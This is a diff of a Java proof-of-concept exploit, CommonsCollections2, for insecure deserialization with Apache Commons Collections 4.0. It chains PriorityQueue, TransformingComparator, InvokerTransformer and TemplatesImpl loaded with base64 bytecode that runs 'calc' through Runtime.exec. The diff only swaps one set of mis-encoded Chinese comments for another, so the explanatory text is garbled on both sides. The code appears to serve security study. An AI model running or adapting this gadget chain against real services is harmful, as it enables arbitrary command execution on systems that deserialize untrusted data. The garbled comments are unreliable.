@@ -16,10 +16,10 @@ import java.util.PriorityQueue;
 public class CommonsCollections2 {
 
     /**
-     * ÀûÓÃÌõ¼ş±È½Ï¿Á¿Ì£ºÊ×ÏÈ CommonsCollections3 ÖĞÎŞ·¨Ê¹ÓÃ£¬ÒòÎªÆä TransformingComparator ÎŞ·¨ĞòÁĞ»¯¡£Æä´ÎÖ»ÓĞ CommonsCollections4-4.0 ¿ÉÒÔÊ¹ÓÃ£¬
-     * ÒòÎª CommonsCollections4 ÆäËû°æ±¾È¥µôÁË InvokerTransformer µÄ Serializable ¼Ì³Ğ£¬µ¼ÖÂÎŞ·¨ĞòÁĞ»¯
-     * Apache common3.readObject·½·¨Ôö¼ÓÁËcheckĞ£Ñé
-     * Apache Common4.2¼°ÒÔÉÏ³¡¾°ÖĞInvokerTransformer½ûÖ¹ÁËwriteObjectºÍreadObject
+     * åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼šé¦–å…ˆ CommonsCollections3 ä¸­æ— æ³•ä½¿ç”¨ï¼Œå› ä¸ºå…¶ TransformingComparator æ— æ³•åºåˆ—åŒ–ã€‚å…¶æ¬¡åªæœ‰ CommonsCollections4-4.0 å¯ä»¥ä½¿ç”¨ï¼Œ
+     * å› ä¸º CommonsCollections4 å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–
+     * Apache common3.readObjectæ–¹æ³•å¢åŠ äº†checkæ ¡éªŒ
+     * Apache Common4.2åŠä»¥ä¸Šåœºæ™¯ä¸­InvokerTransformerç¦æ­¢äº†writeObjectå’ŒreadObject
      *
      * ->PriorityQueue.readObject()
      *       ->PriorityQueue.heapify()
@@ -28,59 +28,59 @@ public class CommonsCollections2 {
      *                 ->TransformingComparator.compare()
      *                     ->InvokerTransformer.transform()
      *                         ->TemplatesImpl.newTransformer()
-     *                         ->¡­¡­¡­¡­
-     * Q£ºÎªÊ²Ã´ÒªÓÃreadObjectº¯Êı£¿
-     * A£ºÒòÎªĞèÒªsitedownº¯ÊıÖĞÊ¹ÓÃµ½ÁË±È½ÏÆ÷£¬heaifyº¯ÊıÖĞÓÖµ÷ÓÃÁËsitedownº¯Êı£¬¶øreadObjectº¯ÊıÓÖµ÷ÓÃÁËheapifyº¯Êı
-     * Q£ºÎªÊ²Ã´ĞèÒª±È½ÏÆ÷£¿
-     * A£ºÒòÎª¿ÉÒÔÔÚ±È½ÏÆ÷ÖĞ´«Èëinvoketransformer
-     * A£º0420¸üĞÂ£ºĞèÒª±È½ÏÆ÷²¢²»ÊÇÒòÎªĞèÒª´«Èëinvoketransformer£¬ÊÇÒòÎªĞèÒªÊ¹ÓÃpriorityQueue·´ĞòÁĞ»¯Ö´ĞĞÈÎÒâÃüÁî£¬ÓĞÁ½¸öÌõ¼ş1¡¢Ò»¸öÊÇ´«ÈëµÄ¶ÔÏóĞèÒªÊµÏÖreadObejct2¡¢¶øÊÇÊµÏÖcomparator½Ó¿Ú
+     *                         ->â€¦â€¦â€¦â€¦
+     * Qï¼šä¸ºä»€ä¹ˆè¦ç”¨readObjectå‡½æ•°ï¼Ÿ
+     * Aï¼šå› ä¸ºéœ€è¦sitedownå‡½æ•°ä¸­ä½¿ç”¨åˆ°äº†æ¯”è¾ƒå™¨ï¼Œheaifyå‡½æ•°ä¸­åˆè°ƒç”¨äº†sitedownå‡½æ•°ï¼Œè€ŒreadObjectå‡½æ•°åˆè°ƒç”¨äº†heapifyå‡½æ•°
+     * Qï¼šä¸ºä»€ä¹ˆéœ€è¦æ¯”è¾ƒå™¨ï¼Ÿ
+     * Aï¼šå› ä¸ºå¯ä»¥åœ¨æ¯”è¾ƒå™¨ä¸­ä¼ å…¥invoketransformer
+     * Aï¼š0420æ›´æ–°ï¼šéœ€è¦æ¯”è¾ƒå™¨å¹¶ä¸æ˜¯å› ä¸ºéœ€è¦ä¼ å…¥invoketransformerï¼Œæ˜¯å› ä¸ºéœ€è¦ä½¿ç”¨priorityQueueååºåˆ—åŒ–æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæœ‰ä¸¤ä¸ªæ¡ä»¶1ã€ä¸€ä¸ªæ˜¯ä¼ å…¥çš„å¯¹è±¡éœ€è¦å®ç°readObejct2ã€è€Œæ˜¯å®ç°comparatoræ¥å£
      *
-     * templatesImplÀûÓÃ
-     * ¼ÓÔØ¶ÔÏóĞèÒªÊÇcom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletµÄÊµÏÖÀà
-     * ĞèÒªÉèÖÃ_name,_bytecodes
-     * _tfactoryÊôĞÔÔÚ¸ß°æ±¾ĞèÒªÉèÖÃ£¬jdk7u21ÖĞ²»ÊÇ±ØĞë£¬¿´jdk°æ±¾¶øÑÔ-¡·defineTransletClasses
+     * templatesImplåˆ©ç”¨
+     * åŠ è½½å¯¹è±¡éœ€è¦æ˜¯com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletçš„å®ç°ç±»
+     * éœ€è¦è®¾ç½®_name,_bytecodes
+     * _tfactoryå±æ€§åœ¨é«˜ç‰ˆæœ¬éœ€è¦è®¾ç½®ï¼Œjdk7u21ä¸­ä¸æ˜¯å¿…é¡»ï¼Œçœ‹jdkç‰ˆæœ¬è€Œè¨€-ã€‹defineTransletClasses
      *
      * @param args
      */
     public static void main(String[] args) {
 
         try{
-            //×Ö½ÚÂë
+            //å­—èŠ‚ç 
             byte[] code = Base64.getDecoder().decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
 
-            //·´ÉäÉèÖÃ Field
+            //åå°„è®¾ç½® Field
             TemplatesImpl templates = new TemplatesImpl();
             setFieldValue(templates, "_bytecodes", new byte[][]{code});
             setFieldValue(templates, "_name", "HelloTemplatesImpl");
             setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
 
-            //ÎªÁËÖ´ĞĞ templates.newTransformer
+            //ä¸ºäº†æ‰§è¡Œ templates.newTransformer
             InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
 
-            //TransformingComparator ÊµÀı£¬²ÎÊıĞèÒª¸ötransform¶ÔÏó
-            //½«Ò»¸öComparator¶ÔÏó×ª»»ÎªÁíÒ»¸öComparator¶ÔÏó
+            //TransformingComparator å®ä¾‹ï¼Œå‚æ•°éœ€è¦ä¸ªtransformå¯¹è±¡
+            //å°†ä¸€ä¸ªComparatorå¯¹è±¡è½¬æ¢ä¸ºå¦ä¸€ä¸ªComparatorå¯¹è±¡
             TransformingComparator comparator = new TransformingComparator(invokerTransformer);
 
-            //PriorityQueue ÊµÀı£¬java¶ÓÁĞ
+            //PriorityQueue å®ä¾‹ï¼Œjavaé˜Ÿåˆ—
             PriorityQueue priorityQueue = new PriorityQueue(2);
-            //ÏÈÉèÖÃÎªÕı³£±äÁ¿Öµ£¬ºóÃæ¿ÉÒÔÍ¨¹ısetFieldValueĞŞ¸Ä
+            //å…ˆè®¾ç½®ä¸ºæ­£å¸¸å˜é‡å€¼ï¼Œåé¢å¯ä»¥é€šè¿‡setFieldValueä¿®æ”¹
             priorityQueue.add(1);
             priorityQueue.add(1);
 
-            //·´ÉäÉèÖÃ Field
-            //½«templates·ÅÈëµ½¶ÓÁĞÖĞÈ¥ÁË
+            //åå°„è®¾ç½® Field
+            //å°†templatesæ”¾å…¥åˆ°é˜Ÿåˆ—ä¸­å»äº†
             Object[] objects = new Object[]{templates, templates};
             setFieldValue(priorityQueue, "queue", objects);
             setFieldValue(priorityQueue, "comparator", comparator);
 
-            //ĞòÁĞ»¯
+            //åºåˆ—åŒ–
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos);
             oos.writeObject(priorityQueue);
             oos.flush();
             oos.close();
 
-            //²âÊÔ·´ĞòÁĞ»¯
+            //æµ‹è¯•ååºåˆ—åŒ–
             ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
             ObjectInputStream ois = new ObjectInputStream(bais);
             ois.readObject();
@@ -93,7 +93,7 @@ public class CommonsCollections2 {
     }
 
 
-    //·´ÉäÉèÖÃ Field
+    //åå°„è®¾ç½® Field
     public static void setFieldValue(Object object, String fieldName, Object value) {
         try {
             Field field = object.getClass().getDeclaredField(fieldName);
